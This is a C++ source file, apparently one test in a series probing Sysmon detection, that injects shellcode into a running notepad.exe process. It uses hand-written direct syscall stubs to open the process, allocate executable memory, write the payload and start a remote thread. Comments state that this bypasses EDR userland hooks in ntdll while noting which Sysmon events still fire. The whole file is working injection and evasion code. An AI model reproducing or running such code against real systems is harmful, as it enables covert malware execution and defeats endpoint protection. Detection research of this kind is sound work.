// First run t5_ssn_finder.cpp and map those SSN into the t5_syscalls.asm in same order of apperance
// Compile with the t5_syscall.o
#include "common.h"

// NT types needed for syscall signatures
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Syscall stubs declared in syscalls.asm
extern "C" {
    NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );
    NTSTATUS SysNtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    NTSTATUS SysNtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );
    NTSTATUS SysNtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );
}

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Build required structures for NtOpenProcess
    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(OBJECT_ATTRIBUTES);

    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;

    // EID 10 fires here — kernel records handle open
    // ntdll hook bypassed — Sysmon still catches it
    HANDLE hProc = NULL;
    NTSTATUS st = SysNtOpenProcess(
        &hProc,
        PROCESS_VM_WRITE         |
        PROCESS_VM_OPERATION     |
        PROCESS_CREATE_THREAD    |
        PROCESS_QUERY_INFORMATION,
        &oa,
        &cid
    );
    wprintf(L"[+] SysNtOpenProcess: 0x%08X handle: 0x%p\n", st, hProc);
    if (!hProc) {
        wprintf(L"[-] Failed to open process\n");
        return 1;
    }

    // Allocate RWX memory in remote process
    PVOID remoteMem = NULL;
    SIZE_T allocSize = shellcode_size;
    st = SysNtAllocateVirtualMemory(
        hProc,
        &remoteMem,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    wprintf(L"[+] SysNtAllocateVirtualMemory: 0x%08X at 0x%p\n", st, remoteMem);
    if (st != 0) {
        wprintf(L"[-] Allocation failed\n");
        return 1;
    }

    // Write shellcode
    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(
        hProc,
        remoteMem,
        shellcode,
        shellcode_size,
        &written
    );
    wprintf(L"[+] SysNtWriteVirtualMemory: 0x%08X wrote %zu bytes\n", st, written);
    if (st != 0) {
        wprintf(L"[-] Write failed\n");
        return 1;
    }

    // EID 8 fires here — kernel thread creation event identical to T1/T2
    // ntdll hook bypassed — Sysmon still catches it
    HANDLE hThread = NULL;
    st = SysNtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        hProc,
        remoteMem,
        NULL,
        0,
        0, 0, 0,
        NULL
    );
    wprintf(L"[+] SysNtCreateThreadEx: 0x%08X\n", st);
    if (!hThread) {
        wprintf(L"[-] Thread creation failed\n");
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] ntdll hooks bypassed — Sysmon should still catch EID 8 and 10\n");
    wprintf(L"[*] Direct syscalls evade EDR userland hooks not kernel monitoring\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
